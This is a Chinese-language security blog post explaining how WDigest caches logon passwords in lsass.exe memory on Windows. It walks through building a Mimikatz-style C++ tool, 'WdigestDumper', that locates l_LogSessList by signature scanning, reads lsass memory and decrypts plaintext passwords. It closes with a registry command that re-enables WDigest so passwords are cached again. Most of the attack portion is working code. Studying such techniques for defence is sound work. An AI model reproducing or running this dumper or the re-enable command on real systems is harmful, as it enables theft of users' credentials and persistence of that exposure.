---
title: Sekurlsa - 如何从 Wdigest 中转储用户登录凭据
date: 2023-02-06 23:26:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Windows", "Lsass"]
layout: post
---

## 0. 基础知识

在 Windows Server 2008 R2 之前，系统默认情况下会缓存 WDigest 凭据。在启用 WDigest 的情况下，用户进行交互式身份验证的域名、用户名和明文密码等信息会存储在 LSA 进程内存中，其中明文密码经过 WDigest 模块调用后，会对其使用对称加密算法进行加密。

类似于上一节中的 `LogonSessionList` 全局变量，在 wdigest.dll 模块中存在一个全局变量 `l_LogSessList`，用来存储上述的登录会话信息。同样的，该变量也是一个链表结构，我们可以使用 WinDbg 来遍历该链表，如下图所示。

```c++
!list -x "dS @$extret" poi(wdigest!l_LogSessList)
```

![image-20230122181017142](/assets/posts/2023-02-06-sekurlsa-how-to-dump-user-login-credentials-from-wdigest/image-20230122181017142.png)

这些表项对应的结构包含如下字段：

```c++
typedef struct _WDIGEST_LIST_ENTRY {
	struct _WDIGEST_LIST_ENTRY* Flink;
	struct _WDIGEST_LIST_ENTRY* Blink;
	ULONG	UsageCount;
	struct _WDIGEST_LIST_ENTRY* This;
	LUID LocallyUniqueIdentifier;
} WDIGEST_LIST_ENTRY, * PWDIGEST_LIST_ENTRY;
```

在相对于该结构首部指定偏移量的位置，存在 3 个 `LSA_UNICODE_STRING` 字段，如下所示，可以为这 3 个字段创建一个新的数据结构 `GENERIC_PRIMARY_CREDENTIAL`。具体的偏移量如下所示。

```c++ 
typedef struct _GENERIC_PRIMARY_CREDENTIAL {
	LSA_UNICODE_STRING UserName;      // 用户名，偏移量：0x30, 48
	LSA_UNICODE_STRING DomainName;    // 域名，偏移量：0x40, 64
	LSA_UNICODE_STRING Password;      // 加密后的明文密码，偏移量：0x50, 80
} GENERIC_PRIMARY_CREDENTIAL, * PGENERIC_PRIMARY_CREDENTIAL;
```

其中 UserName 的偏移量为 `0x30`，我们可以通过 WinDBG 遍历出所有的用户名，如下图所示。

```c++
!list -x "dS @$extret+0x30" poi(wdigest!l_LogSessList)
```

![image-20230122185714915](/assets/posts/2023-02-06-sekurlsa-how-to-dump-user-login-credentials-from-wdigest/image-20230122185714915.png)

在偏移量为 `0x40` 处获取域名，如下图所示。

```c++
!list -x "dS @$extret+0x40" poi(wdigest!l_LogSessList)
```

![image-20230122185751079](/assets/posts/2023-02-06-sekurlsa-how-to-dump-user-login-credentials-from-wdigest/image-20230122185751079.png)

为了能够在 `l_LogSessList` 中提取出用户明文密码，首先需要从 lsass.exe 进程中计算出加载的 wdigest.dll 模块的基地址，然后在该模块中定位该变量，最后从 `l_LogSessList` 中解密用户凭据。至于如何找这个变量，同样可以采用签名扫描的方法。这里使用到的特征码如下：

```c++
BYTE PTRN_WIN5_LogSessHandlerPasswdSet[] = { 0x48, 0x3b, 0xda, 0x74 };
BYTE PTRN_WIN6_LogSessHandlerPasswdSet[] = { 0x48, 0x3b, 0xd9, 0x74 };
PATCH_GENERIC WDigestReferences[] = {
	{WIN_BUILD_XP,		{sizeof(PTRN_WIN5_LogSessHandlerPasswdSet),	PTRN_WIN5_LogSessHandlerPasswdSet},	{0, NULL}, {-4, 36}},
	{WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_LogSessHandlerPasswdSet),	PTRN_WIN5_LogSessHandlerPasswdSet},	{0, NULL}, {-4, 48}},
	{WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_LogSessHandlerPasswdSet),	PTRN_WIN6_LogSessHandlerPasswdSet},	{0, NULL}, {-4, 48}},
};
```

此外，用户的明文密码属于机密信息，因此也经过 `LsaProtectMemory()` 函数调用后进行对称加密。为了对获取到的加密密码进行解密，同样需要利用与上节相同的方法获取加密密钥和初始化向量。

下面笔者参考 Mimikatz 的代码，通过 C/C++ 编写一个名为 WdigestDumper 的工具，用来提取 lsass.exe 进程中的明文密码。由于篇幅限制仅描述关键代码部分，相关头文件定义以及各个函数的定义位置请读者自行实现。此外，本节的大部分代码与上一节 MSV1_0 的分析相同，在此笔者只从主要的变化点开始讲解。

## 1 打印用户凭据信息

### 1.1 处理用户凭据结构

在枚举完 `LogonSessionList` 中的会话信息后，由 `LsaLogonData()` 函数调用自定义函数 `WDigestEnumerateCreds()` 来处理 wdigest.dll 模块中的用户凭据信息，如下所示。

```c++
BOOL LsaLogonData(PBASIC_SECURITY_LOGON_SESSION_DATA pSessionData)
{
	BOOL status = FALSE;
	if (pSessionData->LogonType != Network)
	{
		PrintLogonData(pSessionData);

		wprintf(L"\n[+] Wdigest Credential : ");
		if (Lsass_Msv1_0_Package.Module.isPresent && Lsass_Msv1_0_Package.isValid)
		{
			WDigestEnumerateCreds(pSessionData->LogonId);
			wprintf(L"\n>>>>=================================================================\n");

		}
	}
	return status;
}
```

下面编写 `WDigestEnumerateCreds()` 函数，其内部首先调用 `LsaSearchGeneric()` 函数来定位 `l_LogSessList` 变量，并将包含凭据信息的 `GENERIC_PRIMARY_CREDENTIAL` 相对于 `WDIGEST_LIST_ENTRY` 结构的起始偏移量赋值给 `offsetWDigestPrimary`，如下所示。

```c++
PWDIGEST_LIST_ENTRY l_LogSessList = NULL;
LONG offsetWDigestPrimary = 0;

BOOL WDigestEnumerateCreds(PLUID LogonId)
{
	BOOL status = FALSE;
	PVOID pStruct;
	GENERIC_PRIMARY_CREDENTIAL primaryCredentials;
	MEMORY_ADDRESS lsassMemory;

	if (Lsass_WDigest_Package.Module.isPresent)
	{
		if (LsaSearchGeneric(&cLsass, &Lsass_WDigest_Package.Module, WDigestReferences, ARRAYSIZE(WDigestReferences), (PVOID*)&l_LogSessList, NULL, &offsetWDigestPrimary)
			&& Lsass_WDigest_Package.Module.isInit)
		{
			if (ReadProcessMemory(cLsass.hProcess, l_LogSessList, &pStruct, sizeof(PVOID), NULL))
			{
				while (pStruct != l_LogSessList)
				{
					if (lsassMemory.address = LocalAlloc(LPTR, offsetWDigestPrimary + sizeof(GENERIC_PRIMARY_CREDENTIAL)))
					{
						if (ReadProcessMemory(cLsass.hProcess, pStruct, lsassMemory.address, offsetWDigestPrimary + sizeof(GENERIC_PRIMARY_CREDENTIAL), NULL))
						{
							if (SecEqualLuid(LogonId, (PLUID)((PBYTE)lsassMemory.address + FIELD_OFFSET(WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier))))
							{
								primaryCredentials = *(PGENERIC_PRIMARY_CREDENTIAL)((PBYTE)lsassMemory.address + offsetWDigestPrimary);
								WDigestCredsOutput(&primaryCredentials);
							}
							pStruct = ((PLIST_ENTRY)lsassMemory.address)->Flink;
						}
						else
							break;
					}
					
				}
			}
		}
	}

	return status;
}
```

然后，遍历整个`l_LogSessList` 链表，并通过 `SecEqualLuid()` 函数对 `l_LogSessList` 中的 `LocallyUniqueIdentifier` 与 `LogonSessionList` 中的登录 ID 进行比较，如果相等，则进入 `WDigestCredsOutput()` 函数打印凭据信息。

### 1.2 打印用户明文凭据

最后编写 `WDigestCredsOutput()` 函数，该函数先打印 WDigest 凭据中的用户名和域名，最后使用 `LsaUnprotectMemory()` 函数对凭据中的用户密码进行解密后输出明文密码，如下所示。

```c++
void WDigestCredsOutput(PGENERIC_PRIMARY_CREDENTIAL mesCreds)
{
	if (mesCreds)
	{
		if (mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
		{
			if (GetUnicodeString(&mesCreds->UserName, cLsass.hProcess))
			{
				wprintf(L"\n\t* UserName     : %wZ", mesCreds->UserName);
			}
			if (GetUnicodeString(&mesCreds->Domaine, cLsass.hProcess))
			{
				wprintf(L"\n\t* Domain       : %wZ", mesCreds->Domaine);
			}
			if (GetUnicodeString(&mesCreds->Password, cLsass.hProcess))
			{
				if (LsaUnprotectMemory(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength))
				{
					wprintf(L"\n\t* Password     : ");
					if (IsTextUnicode(mesCreds->Password.Buffer, mesCreds->Password.Length, NULL))
					{
						wprintf(L"%wZ", mesCreds->Password);
					}
					else
					{
						PrintfHex(mesCreds->Password.Buffer, mesCreds->Password.Length);
					}
					
				}

			}
		}
	}
}
```

至此，WdigestDumper 的主要代码编写完成。

## 2. 运行效果演示

以管理员权限运行 WdigestDumper，即可从系统 lsass.exe 进程内存中提取出用户的明文密码，如下图所示。

```
WdigestDumper.exe
```

![image-20230122194306895](/assets/posts/2023-02-06-sekurlsa-how-to-dump-user-login-credentials-from-wdigest/image-20230122194306895.png)

为了防止用户的明文密码在内存中泄露，微软在 2014 年 5 月发布了 KB2871997 补丁，关闭了 Wdigest 功能，无法从内存中获取明文密码。并且，在 Windows Server 2012 及以上版本中都默认关闭 Wdigest 功能，无法从内存中获取明文密码。但是可以通过修改注册表重新开启 Wdigest，如下所示。

```
# Enable Wdigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
# Disable Wdigest
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```
